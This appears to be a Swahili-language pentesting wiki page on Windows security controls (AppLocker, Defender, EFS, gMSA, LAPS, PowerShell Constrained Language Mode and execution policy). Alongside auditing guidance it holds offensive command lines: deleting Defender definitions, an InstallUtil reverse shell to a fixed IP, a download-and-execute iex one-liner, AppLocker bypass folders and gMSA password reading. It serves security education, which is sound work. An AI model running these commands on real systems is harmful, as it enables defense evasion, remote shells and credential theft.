# Vidhibiti vya Usalama vya Windows

{{#include ../banners/hacktricks-training.md}}

## Sera ya AppLocker

Orodha ya kuruhusu programu ni orodha ya programu au faili tekelezi zilizoidhinishwa ambazo zinaruhusiwa kuwepo na kuendeshwa kwenye mfumo. Lengo ni kulinda mazingira dhidi ya malware hatari na programu zisizoidhinishwa ambazo haziendani na mahitaji mahususi ya biashara ya shirika.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni **suluhisho la Microsoft la kuruhusu programu** na huwapa wasimamizi wa mifumo uwezo wa kudhibiti **programu na faili ambazo watumiaji wanaweza kuendesha**. Hutoa **udhibiti wa kina** wa faili tekelezi, script, faili za Windows installer, DLL, programu zilizofungashwa na installers za programu zilizofungashwa.\
Ni kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** na ufikiaji wa kuandika kwenye saraka fulani, **lakini haya yote yanaweza kukwepwa**.

### Ukaguzi

Angalia faili/viendelezi vipi vimeorodheshwa kuwa vimezuiwa/vimeruhusiwa:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy` hutathmini faili zinazoweza kutumika kwa utambulisho mahususi kulingana na sera ya AppLocker. Jaribu akaunti ambayo tokeni yake itatekeleza payload, kwa kuwa sheria zinaweza kulenga watumiaji au vikundi; `Get-AppLockerFileInformation` pia ni muhimu kukagua njia, hash, na metadata ya mchapishaji ambayo sheria zinaweza kulingana nayo.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

Kabla ya kuchukulia matokeo ya jaribio lililokataliwa kama kizuizi kilichotekelezwa, kagua **hali halisi ya utekelezaji wa mkusanyiko huo wa kanuni** na huduma ya Application Identity. `AuditOnly` hutathmini kanuni lakini bado huruhusu utekelezaji, huku `NotConfigured` ikiwa si sawa na kuzimwa wakati mkusanyiko huo una kanuni.<sup>[[7]](#references)</sup> `AppIDSvc` iliyosimamishwa huzuia AppLocker kutekeleza kanuni.<sup>[[9]](#references)</sup> Ukaguzi huu hutofautisha bypass halisi na sera ambayo haikuwahi kuzuia faili.

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

Kwa jaribio la utekelezaji linalodhibitiwa, linganisha logi ya matukio ya AppLocker: **8003/8006** humaanisha EXE/DLL au script/MSI ingezuiwa katika audit mode; **8004/8007** humaanisha ilizuiwa kweli. Jaribu aina ileile ya faili na utambulisho uleule kama njia ya utekelezaji inayokusudiwa.<sup>[[8]](#references)</sup>

Njia hii ya registry ina usanidi na sera zinazotumiwa na AppLocker, hivyo inatoa njia ya kukagua seti ya sasa ya sheria zinazotekelezwa kwenye mfumo:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Folda zinazoandikika** zinazofaa kwa bypass ya Sera ya AppLocker: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows`, kuna **folda zinazoandikika** unazoweza kutumia kufanya **bypass** hii.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Binaries za [**"LOLBAS's"**](https://lolbas-project.github.io/) ambazo kwa kawaida **huaminika** zinaweza pia kusaidia kukwepa AppLocker.
- **Rules zilizoandikwa vibaya zinaweza pia kukwepwa**
  - Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **folder inayoitwa `allowed`** mahali popote na itaruhusiwa.
  - Mashirika pia mara nyingi huzingatia **kuzuia executable ya `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, lakini husahau kuhusu **maeneo mengine** ya [**PowerShell executables**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), kama `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
- **Utekelezaji wa DLL huwashwa mara chache sana** kutokana na mzigo wa ziada unaoweza kuweka kwenye mfumo, pamoja na kiasi cha majaribio kinachohitajika ili kuhakikisha kuwa hakuna kitakachoharibika. Kwa hiyo, kutumia **DLLs kama backdoors kutasaidia kukwepa AppLocker**.
- Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza** code ya Powershell katika process yoyote na kukwepa AppLocker. Kwa maelezo zaidi, angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Uhifadhi wa Credentials

### Security Accounts Manager (SAM)

Credentials za ndani zipo kwenye faili hii, na passwords zime-hashiwa.

### Local Security Authority (LSA) - LSASS

**Credentials** (zilizo-hashiwa) **huhifadhiwa** kwenye **memory** ya subsystem hii kwa sababu za Single Sign-On.\
**LSA** husimamia **security policy** ya ndani (sera ya password, ruhusa za users...), **authentication**, **access tokens**...\
LSA ndiyo **itakayokagua** credentials zilizotolewa ndani ya faili la **SAM** (kwa login ya ndani) na **kuwasiliana** na **domain controller** ili ku-authenticate user wa domain.

**Credentials** **huhifadhiwa** ndani ya **process ya LSASS**: tickets za Kerberos, hashes za NT na LM, na passwords zinazoweza kufichuliwa kwa urahisi.

### LSA secrets

LSA inaweza kuhifadhi baadhi ya credentials kwenye disk:

- Password ya akaunti ya kompyuta ya Active Directory (domain controller isiyofikiwa).
- Passwords za akaunti za Windows services
- Passwords za scheduled tasks
- Nyingine (password ya IIS applications...)

### NTDS.dit

Hii ni database ya Active Directory. Inapatikana kwenye Domain Controllers pekee.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ni Antivirus inayopatikana kwenye Windows 10 na Windows 11, na matoleo ya Windows Server. **Huzuia** zana za kawaida za pentesting kama **`WinPEAS`**. Hata hivyo, kuna njia za **kukwepa ulinzi huu**.

### Ukaguzi

Ili kuangalia **hali** ya **Defender**, unaweza kutekeleza PS cmdlet **`Get-MpComputerStatus`** (kagua thamani ya **`RealTimeProtectionEnabled`** ili kujua ikiwa imewashwa):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Ili pia kuorodhesha taarifa zake, unaweza kuendesha:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Mfumo wa Faili Uliosimbwa kwa Usimbaji Fiche (EFS)

EFS hulinda faili kwa kutumia usimbaji fiche, kwa kutumia **ufunguo linganifu** unaojulikana kama **File Encryption Key (FEK)**. Ufunguo huu husimbwa kwa ufunguo wa **umma** wa mtumiaji na kuhifadhiwa kwenye metadata ya NTFS ya faili ya `$EFS` (`$LOGGED_UTILITY_STREAM`), **si** kwenye data stream mbadala ya kawaida ya `$DATA`.<sup>[[10]](#references)</sup> Usimbuaji unapohitajika, **ufunguo binafsi** unaolingana na cheti cha dijitali cha mtumiaji hufungua FEK. Wakala wa kurejesha data (DRA) aliyesanidiwa huwa na nakala tofauti iliyosimbwa ya FEK katika Data Recovery Field.<sup>[[13]](#references)</sup>

**Hali za usimbuaji bila mtumiaji kuanzisha** ni pamoja na:

- Faili au folda zinapohamishiwa kwenye mfumo wa faili usiotumia EFS, kama [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), husimbuliwa kiotomatiki.
- Faili zilizosimbwa zinazotumwa kupitia mtandao kwa kutumia itifaki ya SMB/CIFS husimbuliwa kabla ya kutumwa.

Mbinu hii ya usimbaji fiche huruhusu **ufikiaji wa moja kwa moja** wa faili zilizosimbwa na mmiliki wake. Hata hivyo, kubadilisha tu nenosiri la mmiliki na kuingia kwenye akaunti hakutawezesha usimbuaji.

**Mambo muhimu ya kukumbuka**:

- EFS hutumia FEK linganifu, iliyosimbwa kwa ufunguo wa umma wa mtumiaji.
- Usimbuaji hutumia ufunguo binafsi wa mtumiaji kufikia FEK.
- Usimbuaji wa kiotomatiki hutokea katika hali maalum, kama vile kunakili faili kwenye FAT32 au kuzituma kupitia mtandao.
- Mmiliki anaweza kufikia faili zilizosimbwa bila hatua za ziada.

### Kagua maelezo ya EFS

Usihitimishe kuwa EFS inatumika kwa kuangalia `%APPDATA%\Microsoft\Protect`: folda hii huhifadhi funguo kuu za DPAPI zinazotumiwa na vipengele vingi vya Windows.<sup>[[19]](#references)</sup> Badala yake, kagua faili iliyosimbwa kwa kutumia `cipher /c "C:\path\file"` ili kuorodhesha vyeti vya mtumiaji na vya urejeshaji. `cipher /e` na `cipher /d` husimba na kusimbua faili kwa ajili ya mhusika aliye na ufunguo binafsi unaolingana.<sup>[[11]](#references)</sup>

### Kusimbua faili za EFS

Ikiwa `cipher /c` inaorodhesha cheti cha urejeshaji na una **ufunguo binafsi wa DRA unaolingana** katika faili ya PFX, leta PFX hiyo kwenye hifadhi ya vyeti ya mtumiaji wa sasa, kisha usimbue faili.<sup>[[11]](#references)[[12]](#references)</sup> Cheti kipya cha DRA hakiwezi kusimbua faili za zamani: ufunguo wake wa umma lazima uwe tayari umejumuishwa wakati faili iliposimbwa. Ufikiaji kupitia ACL za NTFS au kuweka upya nenosiri la akaunti pekee hakutoi ufunguo binafsi unaohitajika.<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### Kuwa na Mamlaka ya Mfumo

Mbinu hii inahitaji **mtumiaji mwathiriwa** awe **anaendesha** **process** kwenye host. Ikiwa hivyo, kutoka kwenye session ya `meterpreter` unaweza kuiga tokeni ya process ya mtumiaji (`impersonate_token` kutoka `incognito`). Vinginevyo, unaweza kufanya `migrate` kuingia kwenye process ya mtumiaji.

#### Kujua Password ya Mtumiaji

Mimikatz inaweza kuingiza certificate na private key ya mtumiaji, kisha kuzitumia kusimbua faili zilizolindwa na EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** ili kurahisisha usimamizi wa service accounts katika miundombinu ya IT. Tofauti na service accounts za kawaida ambazo mara nyingi huwa na mpangilio wa "**Password never expire**" uliowezeshwa, gMSA hutoa suluhisho salama na rahisi zaidi kusimamia:

- **Usimamizi wa Password Kiotomatiki**: gMSA hutumia password changamano ya baiti 240 ambayo kwa kawaida hubadilishwa kila siku 30. Domain controllers huitengeneza kwa kutumia nyenzo za ufunguo wa KDS, hivyo kuondoa hitaji la kusasisha password kwa mikono.<sup>[[16]](#references)[[20]](#references)</sup>
- **Usalama Ulioimarishwa**: Akaunti hizi haziathiriwi na kufungiwa kwa akaunti na haziwezi kutumiwa kuingia kwa njia shirikishi, jambo linaloimarisha usalama wake.
- **Usaidizi wa Host Nyingi**: gMSA zinaweza kutumiwa na host nyingi, hivyo zinafaa kwa services zinazoendeshwa kwenye servers nyingi.
- **Uwezo wa Scheduled Task**: Tofauti na managed service accounts, gMSA zinaweza kuendesha scheduled tasks.
- **Usimamizi Rahisi wa SPN**: Mfumo husasisha kiotomatiki Service Principal Name (SPN) kunapokuwa na mabadiliko kwenye maelezo ya sAMaccount au jina la DNS la kompyuta, na hivyo kurahisisha usimamizi wa SPN.

Domain controller hutengeneza LDAP attribute _**msDS-ManagedPassword**_ wakati wa kuisoma, kwa kutumia nyenzo za password zinazotokana na KDS; thamani hiyo si password iliyohifadhiwa kivyake. Kwa kawaida hubadilika kila siku 30.<sup>[[20]](#references)</sup> [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) inayorejeshwa **si password iliyosimbwa kwa njia fiche**: sehemu yake ya `CurrentPassword` ina password ya maandishi wazi.<sup>[[14]](#references)</sup> Ruhusa hukaguliwa kwa kutumia `msDS-GroupMSAMembership`, kwa hiyo principal yeyote aliyepewa ruhusa ya kuipata yumo kwenye wigo, si wasimamizi au host za service pekee.<sup>[[15]](#references)</sup> Muunganisho wa LDAP lazima utoe usiri, kwa mfano kupitia LDAPS au SASL sealing.<sup>[[20]](#references)</sup>

Kwa utohozi wa password offline baada ya kufichuliwa kwa KDS root key, tazama [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md).

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Unaweza kusoma password hii kwa kutumia [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Pata maelezo zaidi katika chapisho hili**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Pia, angalia [ukurasa huu wa wavuti](https://cube0x0.github.io/Relaying-for-gMSA/) unaoeleza jinsi ya kufanya **NTLM relay attack** ili **kusoma** **nenosiri** la **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Tofautisha **legacy Microsoft LAPS** na utekelezaji asilia wa **Windows LAPS** wakati wa enumeration. Windows LAPS ilitolewa katika masasisho ya Windows ya Aprili 11, 2023 na inaweza kuhifadhi nakala ya nenosiri la msimamizi wa ndani linalosimamiwa kwenye **Windows Server Active Directory** au **Microsoft Entra ID**. Katika deployments zinazotumia AD, inaweza pia kusimba nywila kwa njia fiche, kuhifadhi historia ya nywila zilizosimbwa kwa njia fiche, na kusimamia nenosiri la DSRM la domain controller. MSI ya zamani inayoweza kupakuliwa imeacha kutumika kwenye matoleo mapya ya Windows, ingawa Windows LAPS inaweza kufanya kazi katika legacy-emulation mode.<sup>[[6]](#references)</sup>

Kwa kuwa legacy Microsoft LAPS na Windows LAPS ni implementations tofauti, tambua ni ipi iliyowekwa kabla ya kutumia mashambulizi mahususi kwa attribute au cmdlet. Ukurasa uliounganishwa unaeleza ugunduzi, enumeration ya ACL, urejeshaji, urekebishaji wa muda wa kuisha, na urejeshaji wa offline bila kurudia taratibu hizo hapa.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **huzuia matumizi ya vipengele vingi** vinavyohitajika ili kutumia PowerShell kwa ufanisi, kama vile kuzuia COM objects, kuruhusu tu aina za .NET zilizoidhinishwa, workflows zinazotegemea XAML, PowerShell classes, na mengineyo.

### **Kagua**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Kupita

`powershell.exe -Version 2` ilikuwa njia ya kurudi kwenye toleo la zamani, lakini ilifanya kazi tu kwenye mifumo iliyokuwa na injini ya hiari ya PowerShell 2 iliyosakinishwa. Haijajumuishwa tena kwenye Windows 11 24H2 na Windows Server 2025 zilizosasishwa; usiichukulie kama njia ya sasa ya kupita CLM.<sup>[[17]](#references)</sup> Chini ya udhibiti wa programu, PowerShell huendesha msimbo usioaminika katika Constrained Language, huku hati zinazoaminiwa na sera zikiweza kuendeshwa katika Full Language.<sup>[[18]](#references)</sup>

Kwa usanidi wa zamani, unaweza kutumia [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Ili kuikompile unaweza kuhitaji** **ku** _**ongeza rejeleo**_ -> _Vinjari_ ->_Vinjari_ -> ongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **ubadilishe mradi uwe .Net4.5**.

#### Kupita moja kwa moja:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza** code ya Powershell katika process yoyote na kukwepa constrained mode. Kwa maelezo zaidi, angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Sera ya Utekelezaji ya PS

Kwa chaguomsingi, imewekwa kuwa **restricted.** Njia kuu za kukwepa sera hii:<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Zaidi yanaweza kupatikana [hapa](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Ni API inayoweza kutumiwa kuthibitisha watumiaji.

SSPI itawajibika kutafuta protocol inayofaa kwa mashine mbili zinazotaka kuwasiliana. Kerberos ndiyo njia inayopendelewa kwa hili. Kisha SSPI itajadili ni protocol ipi ya uthibitishaji itakayotumiwa. Protocol hizi za uthibitishaji huitwa Security Support Provider (SSP), ziko ndani ya kila mashine ya Windows katika mfumo wa DLL, na mashine zote mbili lazima ziunge mkono SSP ileile ili ziweze kuwasiliana.

### Main SSPs

- **Kerberos**: Inayopendelewa
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** na **NTLMv2**: Kwa sababu za uoanifu
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Kwa seva za wavuti na LDAP, nenosiri katika mfumo wa MD5 hash
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL na TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Hutumiwa kujadili protocol itakayotumika (Kerberos au NTLM, huku Kerberos ikiwa chaguo-msingi)
  - %windir%\Windows\System32\lsasrv.dll

#### Majadiliano yanaweza kutoa mbinu kadhaa au moja tu.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kidokezo cha idhini kwa shughuli zinazohitaji ruhusa za juu**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [Kukwepa AppLocker na hali ya lugha iliyozuiliwa ya PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [Jinsi ya ~ kusimbua faili za EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relay kwa gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [Njia 15 za kukwepa PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Kutumia cmdlet za AppLocker za Windows PowerShell](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Muhtasari wa Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [Kufanya kazi na sheria za AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [Kutumia Event Viewer na AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [Michakato na mwingiliano wa AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [Mitiririko ya faili (mifumo ya faili ya ndani)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Amri ya Cipher](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Amri ya Certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Kuhifadhi nakala ya ufunguo binafsi wa EFS wa wakala wa urejeshaji](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [Sifa ya ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [Kulinda akaunti za huduma zinazosimamiwa na kikundi](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Vipengele vilivyoondolewa kwenye Windows client](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [Kutumia App Control kulinda PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [Tukio la 4693 na funguo kuu za DPAPI](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [Uundaji wa msDS-ManagedPassword](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
